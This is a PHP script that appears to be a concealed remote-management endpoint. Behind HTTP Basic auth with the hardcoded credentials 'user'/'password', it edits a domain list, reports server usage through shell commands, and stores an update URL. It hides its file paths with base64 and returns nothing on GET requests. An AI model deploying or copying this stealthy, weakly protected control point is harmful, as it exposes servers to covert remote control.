if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $valid_user = 'user';
    $valid_pass = 'password';
	
    if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW']) || $_SERVER['PHP_AUTH_USER'] !== $valid_user || $_SERVER['PHP_AUTH_PW'] !== $valid_pass) {
        header('WWW-Authenticate: Basic realm="My Realm"');
        header('HTTP/1.0 401 Unauthorized');
        echo 'xxx'; // errorAut
        exit;
    }
	

    $dirpth = base64_decode('L3NpdGVzL2Q'); // d
    if (isset($_POST['siteList']) || isset($_POST['domain'])) {
        $file = $dirpth . '/'.base64_decode('ZG9tYWlucy50eHQ=');
        if ($_POST['req'] === 'add') {
            $siteList = $_POST['siteList'];
            $content = file_get_contents($file);
            if (!empty($content) && substr($content, -1) !== PHP_EOL) { $siteList = PHP_EOL . $siteList;}
            $tulisData = file_put_contents($file, $siteList, FILE_APPEND);
            if ($tulisData !== false) {
                $response = 'done';
            } else {
                $response = 'fail';
            }
        } else if ($_POST['req'] === 'del') {
            $domain = $_POST['domain'];
            $contents = file_get_contents($file);
            $lines = explode("\n", $contents);
            $lines = array_map('trim', $lines); 
            $lineIndex = array_search($domain, $lines);
            if ($lineIndex !== false) {
                unset($lines[$lineIndex]);

                $updatedContents = implode("\n", $lines);

                $hapusData = file_put_contents($file, $updatedContents);
                if ($hapusData !== false) {
                    $response = "done";
                } else {
                    $response = "write failed [server]";
                }
            } else {
                $response = 'fail:' . $domain;
            }
        } else {
            $response = 'no req';
        }
    } elseif(isset($_POST['usage']) && $_POST['usage'] === 'y') {
	
		function getSystemUsage() {
			$cUsage = getServerCPULoad();
			$rUsage = getServerRAMUsage();
			$dUsage = getServerDiskUsage();

			return [
				'cpu' => $cUsage,
				'ram' => $rUsage,
				'disk' => $dUsage,
			];
		}

		function getServerCPULoad() {
			$cpuUsage = exec("top -b -n1 | grep 'Cpu(s)' | awk '{print $2}'");

			// return number_format($cpuUsage,0)."%";
			return intval(number_format($cpuUsage,0));
		}

		function formatSize($sizeInBytes) {
			// $units = ['B', 'K', 'M', 'G'];
			$units = ['K', 'M', 'G'];
			$i = 0;

			while ($sizeInBytes >= 1024 && $i < 3) {
				$sizeInBytes /= 1024;
				$i++;
			}

			// Menggunakan number_format untuk memformat angka dengan 1 desimal jika satuan adalah MB atau GB
			$formattedSize = ($i >= 2 ? number_format($sizeInBytes, 1) : number_format($sizeInBytes, 0));

			$result = $formattedSize . $units[$i];
			return $result;
		}
		
		function getServerRAMUsage() {
			// $ramUsage = exec("free | grep Mem | awk '{print $3/$2 * 100}'");
			$ramUsage = exec("free | grep Mem | awk '{print $2, $3}'");
			$xramUsage = explode(' ',$ramUsage);
			
			$total = $xramUsage[0];
			$used = $xramUsage[1];
			$usePercentage = ($used/$total) * 100;

			return [
				'total' => formatSize($total),
				'used' => formatSize($used),
				// 'usePercentage' => number_format($usePercentage,0)."%"
				'usePercentage' => intval(number_format($usePercentage,0))
			];
		}

		function getServerDiskUsage() {
			$diskUsage = exec("df -h | grep '/dev/' | sort -k2 -h -r | head -n1 | awk '{print $2, $3, $5}'");

			$xdiskUsage = explode(' ',$diskUsage);
			$size = $xdiskUsage[0];
			$used = $xdiskUsage[1];
			$usePercentage = $xdiskUsage[2];

			return [
				'size' => $size,
				'used' => $used,
				// 'usePercentage' => $usePercentage
				'usePercentage' => intval(str_replace('%', '', $usePercentage))
			];
		}
		
		$response = getSystemUsage();
		
    } elseif(isset($_POST['upd']) && $_POST['upd'] === 'y') {
	function isValidURL($url) {
		return filter_var($url, FILTER_VALIDATE_URL) !== false;
	}
        if (isset($_POST['link']) && isValidURL($_POST['link'])) {
            $link = $_POST['link'];
            $upd = file_put_contents($dirpth . '/upd.txt', $link, LOCK_EX);
            if ($upd) {
                $response = 'updated';
            } else {
                $response = 'fail updated';
            }
        } else {
            $response = 'Invalid URL';
        }
    
    } else {
        $response = 'not set';
    }
	header('Content-Type: application/json');
	echo json_encode($response);
} else {
	echo '';
}
